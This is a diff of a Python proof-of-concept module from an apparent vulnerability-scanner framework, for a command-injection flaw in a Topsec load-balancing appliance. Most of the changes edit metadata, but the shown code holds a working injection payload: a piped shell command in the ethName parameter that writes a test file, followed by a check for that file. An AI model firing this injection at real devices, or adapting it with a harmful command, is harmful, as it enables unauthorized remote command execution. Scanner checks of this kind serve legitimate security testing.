@@ -10,13 +10,13 @@ class Vuln(ABVuln):
     type = VulnType.RCE # 漏洞类型
     disclosure_date = '2015-06-02'  # 漏洞公布时间
     desc = '''
-        天融信 /acc/bindipmac/static_restart_arp_action.php 没有对config 和 option做过滤导致命令执行。
+        天融信负载均衡系统 /acc/bindipmac/static_restart_arp_action.php 没有对config 和 option做过滤导致命令执行。
     '''  # 漏洞描述
     ref = ''  # 漏洞来源
     cnvd_id = ''  # cnvd漏洞编号
     cve_id = ''  # cve编号
-    product = '天融信'  # 漏洞应用名称
-    product_version = '天融信'  # 漏洞应用版本
+    product = '负载均衡系统'  # 漏洞应用名称
+    product_version = ''  # 漏洞应用版本
 
 class Poc(ABPoc):
     poc_id = '16d3a5cd-8f57-49ee-a980-4eaf7c94c753'
@@ -34,7 +34,7 @@ class Poc(ABPoc):
             #ref http://www.wooyun.org/bugs/wooyun-2015-0117616
             hh = hackhttp.hackhttp()
             arg = self.target
-            payload='/acc/bindipmac/static_restart_arp_action.php?ethName=%20|%20echo%20testvul%20>%20l.php%20|'
+            payload = '/acc/bindipmac/static_restart_arp_action.php?ethName=%20|%20echo%20testvul%20>%20l.php%20|'
             target = arg + payload
             code, head, res, errcode, _ = hh.http(target)
             payload = '/acc/bindipmac/l.php'
